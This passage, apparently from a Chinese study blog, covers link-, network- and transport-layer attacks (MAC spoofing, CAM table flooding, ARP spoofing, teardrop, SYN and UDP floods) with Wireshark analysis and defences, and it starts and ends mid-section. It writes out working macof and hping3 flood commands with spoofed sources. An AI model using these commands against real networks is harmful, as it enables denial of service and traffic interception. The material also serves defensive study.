<code>1</code> 时，会把<code>192.168.123.37</code>发送的数据包做转发给网关，就可以正常上网，但是<code>192.168.123.37</code>的数据包都会经过 kali。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715282864-12eed658-02cf-489e-8091-dd073306813d.png#align=left&display=inline&height=37&margin=%5Bobject%20Object%5D&name=image.png&originHeight=74&originWidth=848&size=15549&status=done&style=none&width=424" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715282864-12eed658-02cf-489e-8091-dd073306813d.png#align=left&display=inline&height=37&margin=%5Bobject%20Object%5D&name=image.png&originHeight=74&originWidth=848&size=15549&status=done&style=none&width=424" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h1 id="Wireshark-网络安全"><a href="#Wireshark-网络安全" class="headerlink" title="Wireshark 网络安全"></a>Wireshark 网络安全</h1><h2 id="链路层安全"><a href="#链路层安全" class="headerlink" title="链路层安全"></a>链路层安全</h2><h3 id="针对于交换机的安全问题"><a href="#针对于交换机的安全问题" class="headerlink" title="针对于交换机的安全问题"></a>针对于交换机的安全问题</h3><h4 id="MAC对称欺骗-——-macchange"><a href="#MAC对称欺骗-——-macchange" class="headerlink" title="MAC对称欺骗 —— macchange"></a>MAC对称欺骗 —— macchange</h4><p>擦除只是暂时的，不是覆盖原来的mac地址，机器重启后就会恢复。<br>通过MAC地址欺骗达到隐藏真实主机的目的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-e 改变的是后三字节，即不改变生产厂商</span><br><span class="line">-a 同一类型的随机供应商地址 ( macchanger --list=Huawei 就是同一类型 )</span><br><span class="line">-A 随机厂商随机地址</span><br><span class="line">-p 永久修改</span><br><span class="line">-r 完全随机</span><br><span class="line">-l 查看支持的厂商</span><br><span class="line">-b</span><br><span class="line">-m</span><br></pre></td></tr></table></figure><p>设置前需要关闭网卡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig eth0 down</span><br><span class="line"><span class="comment"># -m 不能自己完全随意起，如果前三字节不符合 mac 地址命名规范会报错</span></span><br><span class="line"><span class="comment"># [ERROR] Could not change MAC: interface up or insufficient permissions: Cannot assign requested address</span></span><br><span class="line">sudo macchanger -m 00:90:d1:33:33:33 eth0</span><br><span class="line">sudo ifconfig eth0 up</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605751171287-967e198f-49e0-4d98-b9f6-c3550f0d7c09.png#align=left&display=inline&height=64&margin=%5Bobject%20Object%5D&name=image.png&originHeight=128&originWidth=1154&size=36866&status=done&style=none&width=577" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605751171287-967e198f-49e0-4d98-b9f6-c3550f0d7c09.png#align=left&display=inline&height=64&margin=%5Bobject%20Object%5D&name=image.png&originHeight=128&originWidth=1154&size=36866&status=done&style=none&width=577" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>随机化设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo macchanger -r eth0</span><br></pre></td></tr></table></figure><h3 id="MAC地址泛洪分析-——-溢出交换机CAM表"><a href="#MAC地址泛洪分析-——-溢出交换机CAM表" class="headerlink" title="MAC地址泛洪分析 —— 溢出交换机CAM表"></a>MAC地址泛洪分析 —— 溢出交换机CAM表</h3><p>交换机之所以可以交换数据，是因为交换机在内存中维护着一张CAM表，即 端口 &lt;-&gt; MAC地址<br>当表被添满时，其他主机就无法在对应的端口正常交互数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo macof -h</span><br><span class="line"><span class="comment"># -x 源端口 -y 目的端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泛洪</span></span><br><span class="line">sudo macof -i eth0</span><br></pre></td></tr></table></figure><h4 id="wireshark-抓包分析"><a href="#wireshark-抓包分析" class="headerlink" title="wireshark 抓包分析"></a>wireshark 抓包分析</h4><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756353104-8d3a2f20-b6de-4f3a-96d5-50c27bc73986.png#align=left&display=inline&height=125&margin=%5Bobject%20Object%5D&name=image.png&originHeight=250&originWidth=738&size=30385&status=done&style=none&width=369" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756353104-8d3a2f20-b6de-4f3a-96d5-50c27bc73986.png#align=left&display=inline&height=125&margin=%5Bobject%20Object%5D&name=image.png&originHeight=250&originWidth=738&size=30385&status=done&style=none&width=369" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>因为实际中，主要数据包类型是 tcp 或 udp<br>下面只有 ip 数据包，因此很可能有问题（当然有问题，哈哈<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756440805-bbc21254-960c-424c-adf5-963ddc384ac3.png#align=left&display=inline&height=211&margin=%5Bobject%20Object%5D&name=image.png&originHeight=422&originWidth=1520&size=68067&status=done&style=none&width=760" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756440805-bbc21254-960c-424c-adf5-963ddc384ac3.png#align=left&display=inline&height=211&margin=%5Bobject%20Object%5D&name=image.png&originHeight=422&originWidth=1520&size=68067&status=done&style=none&width=760" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756512911-3a0e38b9-c602-4600-b7b2-400c1d8d8bee.png#align=left&display=inline&height=179&margin=%5Bobject%20Object%5D&name=image.png&originHeight=358&originWidth=802&size=40168&status=done&style=none&width=401" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756512911-3a0e38b9-c602-4600-b7b2-400c1d8d8bee.png#align=left&display=inline&height=179&margin=%5Bobject%20Object%5D&name=image.png&originHeight=358&originWidth=802&size=40168&status=done&style=none&width=401" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>很多无关的 ip 以及 mac地址，数据包很小<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756581434-8a71bd43-da93-4d75-899b-378666a2ed08.png#align=left&display=inline&height=490&margin=%5Bobject%20Object%5D&name=image.png&originHeight=980&originWidth=1890&size=181036&status=done&style=none&width=945" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756581434-8a71bd43-da93-4d75-899b-378666a2ed08.png#align=left&display=inline&height=490&margin=%5Bobject%20Object%5D&name=image.png&originHeight=980&originWidth=1890&size=181036&status=done&style=none&width=945" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756609002-4cbac7d3-258b-48c0-b32b-3f6a61a3b79f.png#align=left&display=inline&height=538&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1076&originWidth=1870&size=215919&status=done&style=none&width=935" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756609002-4cbac7d3-258b-48c0-b32b-3f6a61a3b79f.png#align=left&display=inline&height=538&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1076&originWidth=1870&size=215919&status=done&style=none&width=935" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="查找源头端口"><a href="#查找源头端口" class="headerlink" title="查找源头端口"></a>查找源头端口</h4><p>交换机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">display mac-address</span><br></pre></td></tr></table></figure><p>找到对应的端口<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756855361-66220b4e-54d5-403c-a181-0bacbd3849e3.png#align=left&display=inline&height=437&margin=%5Bobject%20Object%5D&name=image.png&originHeight=874&originWidth=1508&size=566939&status=done&style=none&width=754" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756855361-66220b4e-54d5-403c-a181-0bacbd3849e3.png#align=left&display=inline&height=437&margin=%5Bobject%20Object%5D&name=image.png&originHeight=874&originWidth=1508&size=566939&status=done&style=none&width=754" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h4><p>限制交换机端口 MAC 地址数量，比如这个端口只能有3或5个，那他就只能添加3或5跳记录到CAM表，那么就无法溢出啦。</p><h3 id="STP操纵"><a href="#STP操纵" class="headerlink" title="STP操纵"></a>STP操纵</h3><p>生成树协议按照树的结构构造网络拓扑，避免形成回路。STP协议中的各交换机通过交换BPDU报文信息传播生成树信息，如果伪造BPDU报文，控制交换机的端口转发状态，从而动态改变网络拓扑，劫持网络流量到本地。</p><h3 id="广播风暴"><a href="#广播风暴" class="headerlink" title="广播风暴"></a>广播风暴</h3><p>ARP DHCP 通过在局域网中广播，占用网络资源，网络性能下降 -&gt; 网络速度变慢<br>产生原因</p><ul><li>网络短路引发广播风暴 -&gt; 8根连接 两两连接 -&gt; 互联网上网线导致网络性能下降</li><li>网络中存在环路引发广播风暴</li><li>网卡损坏引发广播风暴</li><li>蠕虫病毒引发广播风暴</li></ul><h2 id="网络层安全"><a href="#网络层安全" class="headerlink" title="网络层安全"></a>网络层安全</h2><h3 id="中间人安全测试-欺骗"><a href="#中间人安全测试-欺骗" class="headerlink" title="中间人安全测试 - 欺骗"></a>中间人安全测试 - 欺骗</h3><h4 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h4><ul><li>局域网内用来寻找主机发送数据包的协议，通过它可以找到指定 IP 地址对应的 MAC地址</li><li>每台终端设备都具有ARP缓存表<ul><li><code>arp -a</code> 查看缓存表</li><li><code>arp -d</code> 删除缓存表</li><li>表的填充，寻找 IP 地址对应MAC地址，如果没有则广播此时设置的目标MAC地址为 (00:00:00:00:00:00) 是否具有IP地址对应的MAC地址，找到填充。</li></ul></li></ul><h4 id="ARP协议分析介绍"><a href="#ARP协议分析介绍" class="headerlink" title="ARP协议分析介绍"></a>ARP协议分析介绍</h4><p>显示过滤器</p><ul><li>arp</li><li>请求数据包<ul><li>arp.opcode == 0x0001</li></ul></li><li>响应数据包<ul><li>arp.opcode == 0x0002</li></ul></li><li>查看源 MAC 地址<ul><li>arp.src.hw_mac == 00:00:00:00:00:00</li><li>arp.src.hw_mac == 00:00:00:00:00:00 &amp;&amp; arp.opcode == 0x0002</li></ul></li></ul><h4 id="专家系统分析"><a href="#专家系统分析" class="headerlink" title="专家系统分析"></a>专家系统分析</h4><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605765841082-6ff4962a-2263-4a9d-91a3-c7c7de181c55.png#align=left&display=inline&height=111&margin=%5Bobject%20Object%5D&name=image.png&originHeight=222&originWidth=1902&size=25972&status=done&style=none&width=951" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605765841082-6ff4962a-2263-4a9d-91a3-c7c7de181c55.png#align=left&display=inline&height=111&margin=%5Bobject%20Object%5D&name=image.png&originHeight=222&originWidth=1902&size=25972&status=done&style=none&width=951" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>网关地址与局域网中的计算机具有一致的MAC地址<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605765875092-b18fe093-4d31-49d3-8ce6-b0970dc062a9.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&name=image.png&originHeight=468&originWidth=1358&size=730973&status=done&style=none&width=679" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605765875092-b18fe093-4d31-49d3-8ce6-b0970dc062a9.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&name=image.png&originHeight=468&originWidth=1358&size=730973&status=done&style=none&width=679" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="出现大量ARP数据包的原因"><a href="#出现大量ARP数据包的原因" class="headerlink" title="出现大量ARP数据包的原因"></a>出现大量ARP数据包的原因</h4><ul><li>ARP主机扫描</li><li>ARP病毒进行通信</li><li>ARP欺骗 中间人安全测试</li></ul><h4 id="防御ARP欺骗措施"><a href="#防御ARP欺骗措施" class="headerlink" title="防御ARP欺骗措施"></a>防御ARP欺骗措施</h4><ul><li>静态绑定ARP表<ul><li>arp -s 网关的IP地址 网关的MAC地址<ul><li>不适合大型网络使用</li><li>需要管理员权限</li><li>win <code>netsh i i show in</code> -&gt; 查看网卡编号</li><li>win <code>netsh -c &quot;i i&quot; add neighbors &lt;网卡编号&gt; &lt;网关IP地址&gt; &lt;网关MAC地址&gt;</code></li></ul></li></ul></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605768196250-3b6f5a7b-e2a3-448d-8b6e-d6534a814bdf.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=1516&size=593279&status=done&style=stroke&width=687" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605768196250-3b6f5a7b-e2a3-448d-8b6e-d6534a814bdf.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=1516&size=593279&status=done&style=stroke&width=687" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><pre><code>  - 验证是否静态绑定 `arp -a`</code></pre><ul><li>交换机也有端口安全配置，固定MAC和IP使用端口<ul><li>不适合大型网络使用</li></ul></li><li>交换机 DHCP-Snooping<ul><li>交换机监听DHCP数据，提取IP和MAC建立DHCP Snooping的绑定表</li></ul></li><li>划分VLAN<ul><li>每一个VLAN就是一个广播域 -&gt; 限制网络范围</li></ul></li></ul><h3 id="泪滴安全测试"><a href="#泪滴安全测试" class="headerlink" title="泪滴安全测试"></a>泪滴安全测试</h3><p>原理介绍</p><ul><li>针对于IP协议的安全测试，主要是伪造IP地址和发送畸形数据包</li><li>向目标发送畸形数据包，使得IP数据包碎片在重组的过程中有重合的部分（偏移位置不够），从而导致目标系统无法进行重组，进一步导致系统奔溃而停止服务。</li></ul><p>下载IP协议案例数据包: <a href="https://wiki.wireshark.org/SampleCaptures?action=AttachFile&do=get&target=teardrop.cap">https://wiki.wireshark.org/SampleCaptures?action=AttachFile&amp;do=get&amp;target=teardrop.cap</a></p><p>根据数据包表示 Identification 来确实是否属于同一分组<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605768822557-4469d415-8fb1-41f5-ad0b-7fbdfc713d8c.png#align=left&display=inline&height=454&margin=%5Bobject%20Object%5D&name=image.png&originHeight=908&originWidth=1780&size=235391&status=done&style=none&width=890" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605768822557-4469d415-8fb1-41f5-ad0b-7fbdfc713d8c.png#align=left&display=inline&height=454&margin=%5Bobject%20Object%5D&name=image.png&originHeight=908&originWidth=1780&size=235391&status=done&style=none&width=890" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>分析 第8和第9个数据包<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605770172122-e947f493-6485-40e5-b24f-372f33908a7a.png#align=left&display=inline&height=428&margin=%5Bobject%20Object%5D&name=image.png&originHeight=856&originWidth=2088&size=223939&status=done&style=none&width=1044" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605770172122-e947f493-6485-40e5-b24f-372f33908a7a.png#align=left&display=inline&height=428&margin=%5Bobject%20Object%5D&name=image.png&originHeight=856&originWidth=2088&size=223939&status=done&style=none&width=1044" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>偏移量仅为 24，远不够36。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605770235520-f1bfbd04-dae5-411c-a191-3c65013266ae.png#align=left&display=inline&height=407&margin=%5Bobject%20Object%5D&name=image.png&originHeight=814&originWidth=2128&size=235361&status=done&style=none&width=1064" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605770235520-f1bfbd04-dae5-411c-a191-3c65013266ae.png#align=left&display=inline&height=407&margin=%5Bobject%20Object%5D&name=image.png&originHeight=814&originWidth=2128&size=235361&status=done&style=none&width=1064" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>因此无法重组</p><p>不过对现在的计算机来说，泪滴测试不会对计算机造成很大的影响，所以基本不关心泪滴安全测试了。不够泪滴测试和ARP泛洪结合，还是能对计算机造成很大的困扰。</p><h2 id="传输层安全"><a href="#传输层安全" class="headerlink" title="传输层安全"></a>传输层安全</h2><p>传输层主要针对TCP和UDP协议，因此拒绝服务DOS（Denial of Service）也主要是基于这两个协议 </p><h3 id="TCP-SYN-泛洪"><a href="#TCP-SYN-泛洪" class="headerlink" title="TCP SYN 泛洪"></a>TCP SYN 泛洪</h3><h4 id="TCP连接介绍"><a href="#TCP连接介绍" class="headerlink" title="TCP连接介绍"></a>TCP连接介绍</h4><ul><li>客户端发送SYN到服务器</li><li>服务器响应 SYN+ACK 到客户机</li><li>客户机发送ACK到服务器</li></ul><p>使用 wireshark 分析 TCP 三次握手数据包<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605793725479-0c582547-d917-4fc3-9cff-31c4d18b2c2b.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=2562&size=134618&status=done&style=none&width=1281" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605793725479-0c582547-d917-4fc3-9cff-31c4d18b2c2b.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=2562&size=134618&status=done&style=none&width=1281" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="TCP-SYN-flooding-安全测试"><a href="#TCP-SYN-flooding-安全测试" class="headerlink" title="TCP SYN flooding 安全测试"></a>TCP SYN flooding 安全测试</h4><p>原理</p><ul><li>客户端发送syn服务端返回syn+ack，如果客户端不再发送ack，那么服务端将等待超时，重新发送syn+ack。如果是大量的等待，就可能导致服务器奔溃。</li></ul><p>案例演示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -q -n --rand-source -S -p 80 --flood &lt;目标IP地址&gt;</span><br></pre></td></tr></table></figure><ul><li>-q: 安静模式 </li><li>-n: 数字化输出，象征性输出主机地址</li><li>–rand-source: 随机源IP</li><li>-S: 发送SYN数据包</li><li>-p: 指向端口</li><li>–flood: 使用泛洪</li></ul><p>为了便于分析。打开 Statistics -&gt; Flow Graph<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605798164166-c6513ee3-00d1-44ae-96a3-f1e112fa6e14.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&name=image.png&originHeight=822&originWidth=976&size=115134&status=done&style=none&width=488" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605798164166-c6513ee3-00d1-44ae-96a3-f1e112fa6e14.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&name=image.png&originHeight=822&originWidth=976&size=115134&status=done&style=none&width=488" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>先选择流类型为TCP<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605799515559-2a58b00c-81af-4d24-af39-eb8c19774b5d.png#align=left&display=inline&height=678&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1356&originWidth=1806&size=131163&status=done&style=none&width=903" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605799515559-2a58b00c-81af-4d24-af39-eb8c19774b5d.png#align=left&display=inline&height=678&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1356&originWidth=1806&size=131163&status=done&style=none&width=903" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>发现客户端发送syn服务端返回syn+ack，但客户端不再发送ack，导致资源消耗。</p><h4 id="TCP-SYN-flooding安全防御"><a href="#TCP-SYN-flooding安全防御" class="headerlink" title="TCP SYN flooding安全防御"></a>TCP SYN flooding安全防御</h4><ul><li>丢弃第一个SYN数据包 -&gt; 用户体验差</li><li>反向探测 -&gt; 向源地址方向发送探测包，确定源地址合法性</li><li>代理模式 -&gt; 防火墙代理 -&gt; 即先与防火墙建立tcp连接</li></ul><h3 id="UDP-泛洪"><a href="#UDP-泛洪" class="headerlink" title="UDP 泛洪"></a>UDP 泛洪</h3><p>非连接状态的协议，简洁协议，控制选项少，不可靠，传输速率高，适合大文件传输</p><p>UDP协议关键点</p><ul><li>源端口</li><li>目的端口</li><li>UDP报文长度</li><li>检验码</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605839057960-48412a34-8873-4ff3-9044-f54e09ea3cfb.png#align=left&display=inline&height=630&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1260&originWidth=1632&size=255005&status=done&style=none&width=816" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605839057960-48412a34-8873-4ff3-9044-f54e09ea3cfb.png#align=left&display=inline&height=630&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1260&originWidth=1632&size=255005&status=done&style=none&width=816" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="UDP-flooding-安全测试"><a href="#UDP-flooding-安全测试" class="headerlink" title="UDP flooding 安全测试"></a>UDP flooding 安全测试</h4><p>原理: 测试人员向目标发送大量巨大的UDP数据包，就会使网络资源被耗尽</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hping3 -q -n -a &lt;fake_ip&gt; --udp -s 53 -p &lt;dst_port&gt; --flood &lt;target_ip&gt; -d 1000</span><br></pre></td></tr></table></figure><p>-a: 伪造的 ip<br>-s: 53端口<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605840005031-623d1d8e-754a-422d-a359-193d2d5888c1.png#align=left&display=inline&height=647&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1294&originWidth=1852&size=317845&status=done&style=none&width=926" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605840005031-623d1d8e-754a-422d-a359-193d2d5888c1.png#align=left&display=inline&height=647&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1294&originWidth=1852&size=317845&status=done&style=none&width=926" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="UDP-flooding-安全防御"><a href="#UDP-flooding-安全防御" class="headerlink" title="UDP flooding 安全防御"></a>UDP flooding 